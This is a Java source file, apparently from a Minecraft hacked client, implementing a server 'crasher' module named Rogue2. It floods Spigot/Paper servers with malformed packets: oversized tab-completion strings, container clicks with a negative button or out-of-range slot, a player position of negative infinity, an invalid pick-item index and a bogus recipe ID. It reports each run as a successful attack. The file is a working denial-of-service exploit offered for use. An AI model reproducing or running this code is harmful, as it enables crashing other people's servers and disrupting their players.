package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.network.protocol.game.*;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.Arrays;
import java.util.List;

    /*
    NOTE: Negative Button & Illegal Position Crash is taken and recoded to Client Version from LiquidBounce
    Negative Button Original Source: https://github.com/CCBlueX/LiquidBounce/blob/nextgen/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/PaperWindowExploit.kt
    Illegal Position Original Source: https://github.com/CCBlueX/LiquidBounce/blob/nextgen/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/NegativeInfinityExploit.kt
    SlotException works only for 1.8.8
    */

public class Rogue2 implements Crasher {
    private static final String METHOD_NAME = "Rogue2";
    private boolean enabled = false;
    private final List<String> commands = Arrays.asList("msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me");

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        boolean tabException = args[3].equals("true");
        boolean buttonException = args[4].equals("true");
        boolean illegalPos = args[5].equals("true");
        boolean spigotException = args[6].equals("true");
        boolean slotException = args[7].equals("true");
        boolean recipeException = args[8].equals("true");
        setEnabled(true);

        AbstractContainerMenu containerMenu = mc.player.containerMenu;
        Int2ObjectArrayMap<ItemStack> int2ObjectArrayMap = new Int2ObjectArrayMap<>();
        int2ObjectArrayMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        for (int i = 0; i < packets; i++) {
            if(tabException) commands.forEach(c -> PacketHelper.send(new ServerboundCommandSuggestionPacket(0, (c + bypassHelper.getNBTTagString(2000)))));
            if(buttonException) PacketHelper.send(new ServerboundContainerClickPacket(containerMenu.containerId, containerMenu.getStateId(), 36, -1, ClickType.SWAP, containerMenu.getSlot(0).getItem().copy(), int2ObjectArrayMap));
            if(illegalPos) PacketHelper.send(new ServerboundMovePlayerPacket.Pos(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            if(spigotException) PacketHelper.send(new ServerboundPickItemPacket(-1));
            if(slotException) PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 127, 0, ClickType.PICKUP_ALL, ItemStack.EMPTY, new Int2ObjectArrayMap<>()));
            if(recipeException && protocol >= 768) PacketHelper.send(new ServerboundRecipeBookSeenRecipePacket(new ResourceLocation(String.valueOf(Integer.MAX_VALUE))));
        }

        if(recipeException && protocol < 768) msgHelper.sendMessage("To use RecipeException you must be using &cVersion 1.21.3+ (Protocol: 768)&7, and your current protocol is &c" + protocol, true);

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[10], tabException[true], buttonException[false], illegalPos[false], spigotException[false], slotException[false], recipeException[false]";
    }

    @Override
    public List<OptionUtil> getOptions(){
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("TabException", OptionType.BOOLEAN),
                new OptionUtil("ButtonException", OptionType.BOOLEAN),
                new OptionUtil("IllegalPos", OptionType.BOOLEAN),
                new OptionUtil("SpigotException", OptionType.BOOLEAN),
                new OptionUtil("SlotException", OptionType.BOOLEAN),
                new OptionUtil("RecipeException", OptionType.BOOLEAN)
        );
    }


    @Override
    public String getDescription() {
        return "Exception Crasher [spigot/paper crasher]";
    }
}